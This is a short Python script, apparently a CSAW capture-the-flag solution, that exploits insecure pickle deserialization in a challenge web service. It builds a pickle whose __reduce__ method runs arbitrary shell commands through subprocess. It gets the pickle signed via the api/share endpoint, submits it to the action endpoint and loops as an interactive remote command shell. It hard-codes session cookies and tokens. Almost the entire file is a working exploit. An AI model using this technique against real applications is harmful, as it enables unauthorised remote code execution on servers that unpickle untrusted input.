import json
from pwn import *

import requests, marshal, cPickle, base64
"""
ip:6002/action (POST, OPTIONS)
action -> QgZdUvrt2Z5wIITqe527VFixJc4
api/delete -> 
api/get -> 
    {"name":"asd"} ->
        {"action":"GET.json.asd.mLUHaCLmmHhl8mR4lDuHKWIx6PE"} 
api/share -> 


api/serialize -> 
    {"name":"asd","object":"a"} -> 
        {"action":"STORE.asd.S'a'\np0\n..RfQELNP6oJZ_97epx6bi5R0UR7U"}

"""


def execcmd(mycmd):
    class cmd(object):
      def __reduce__(self):
        import subprocess
        return (subprocess.check_output, ([mycmd.split()],))
    pckl = "STORE.aaa." + cPickle.dumps(cmd())

    ip = "128.238.62.95"

    cookies = {"_g":"GA1.2.1719987199.1473710206", "__cfduid":"d3962177159e3b8d247784eadb23a25661505505853", "csrftoken": "OcMjaHHsSBJ90qg39M83QZhFyqSnNkF6a5zlusYanGn9SwqkVth2zxIVQmA2BG5M", "session": "eyJ1c2VyIjo2Mn0.DOecjA.UX8Q3zCv7xpyIVcCNPan0HWTGW0"}
    s = requests.Session()

    headers = {"content-type": "application/json"}

    data = {"name":pckl}
    a = s.post("http://web.chal.csaw.io:6001/api/share", json=data, headers=headers, cookies=cookies)

    resp = a.text
    resp = resp[12:-4]
    resp = resp.replace('\\n', '\n').replace('\\\'', '\'')
    d = {"action": resp}
    a = s.post("http://{}:6002/action".format(ip), json=d, headers=headers, cookies=cookies)

    a = s.get("http://{}:6002/share?sig=aaa.RPISEC.umk8IWPx8ujjaLjgYCma4YdQ03E&type=json".format(ip))

    print a.text.decode('string_escape')

while True:
    execcmd(raw_input('> '))
